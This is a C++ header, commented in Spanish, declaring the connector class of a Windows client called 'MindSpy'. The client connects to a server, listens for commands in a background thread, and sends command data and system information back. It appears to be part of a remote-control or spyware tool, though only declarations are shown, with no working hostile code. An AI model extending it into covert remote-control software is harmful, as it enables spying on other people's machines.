#pragma once
#include <windows.h>
#include <string>
#include <sstream>
#include <cstdio>
#include <Iphlpapi.h>
#include "Sistema.h"
#include "Datos.h"
#include "FileSystem.h"
// tama�o de buffer maximo
#define MAX_BUFFER 4096
// Comandos disponibles
#define CANTIDAD_COMANDOS 4
// Constante para comandos no validos
#define COMANDO_NO_EXISTENTE -1
// Version del cliente. Enviada al servidor
#define VERSION_CLIENTE "MindSpy 1.0 - (Alpha, Pre-Release)"

using namespace std;

namespace MindSpy
{
	// M�todos de conexi�n y comunicaci�n con el servidor
	class Conector {
	private:
		// Data del socket
		WSADATA wsd;
		// Socket del cliente
		SOCKET sckt;
		// Informaci�n del servidor
		sockaddr_in server;
		// Informaci�n de sistema
		Sistema sys;
		// Estatus de la conexi�n
		bool Conectado;
		// Mensaje del server
		char msg[MAX_BUFFER];
		/*
		*	Nombre: Escuchar
		*	Par�metros: Ninguno
		*	Funci�n: Ciclo de escucha del cliente. Procesa mensajes
		*	Retorno: Ninguno
		*/
		void Escuchar();

		/*
		*	Nombre: HiloProc
		*	Par�metros: 
		*		-LPARAM l: P�r�metro que contiene un puntero a la clase Conector.
		*	Funci�n: Correr� en un hilo nuevo. Llama a la funci�n Escuchar.
		*	Retorno: unsigned long int, Siempre devuelve TRUE.
		*/
		static DWORD WINAPI HiloProc(LPARAM l)
		{
			Conector *c = (Conector*)l;
			c->Escuchar();
			return TRUE;
		}

		/*
		*	Nombre: TipoComando
		*	Par�metros: 
				-char* c: Texto del comando a buscar
		*	Funci�n: Recorre la lista de comandos en busca de "c" para obtener su ID.
		*	Retorno: int. Si la funci�n tiene �xito, devuelve el ID del comando. Sino, devuelve COMANDO_NO_EXISTENTE
		*/
		int TipoComando(const char*c);

	public:
		/*
		*	Nombre: Conector (Constructor)
		*	Par�metros: 
				- string IP: Direcci�n IP del servidor a conectarse
				- UINT32 Puerto: N�mero de puerto de escucha del servidor
		*	Funci�n: Inicializa y conecta el cliente al servidor.
		*	Retorno: Ninguno
		*/
		Conector();
		
		/*
		*	Nombre: ~Conector (Destructor)
		*	Par�metros: Ninguno
		*	Funci�n: Libera el socket y memoria din�mica reservada
		*	Retorno: Ninguno
		*/
		~Conector();

		/*
		*	Nombre: Listo
		*	Par�metros: Ninguno
		*	Funci�n: Indica si el cliente est� conectado
		*	Retorno: bool. Devuelve true si el cliente est� conectado. false en caso contrario.
		*/
		bool Listo();

		/*
		*	Nombre: EnviarComando
		*	Par�metros: 
				-USHORT SizeofData: Tama�o de la data a enviar
				-USHORT comando: N�mero del comando a enviar
				-BYTE* Data: Puntero a la data que se enviar�. Este puntero puede ser a cualquier estructura
							 de datos compatible.
		*	Funci�n: Envia un comando, junto con su data, al servidor
		*	Retorno: bool. Devuelve true si el mensaje se envi�. False en caso contrario.
		*/
		bool EnviarComando(UINT32 SizeofData, UINT32 comando, BYTE* Data);
	};
}
